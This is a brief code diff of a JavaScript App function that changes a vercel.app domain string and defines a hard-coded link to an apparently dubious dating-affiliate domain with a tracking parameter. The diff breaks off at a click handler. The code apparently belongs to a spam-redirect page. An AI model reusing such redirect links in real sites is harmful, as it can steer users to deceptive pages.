@@ -1,6 +1,6 @@
 function App() {
   const location = window.location.href;
-  const url = location.replace('https://olymteam.vercel.app/', '')
+  const url = location.replace('https://instamedia.vercel.app/', '')
   const re = `https://kc91qn7.datehoneylover.com/v30223a?s1=vercel`
 
   const onClickClose = async () => {
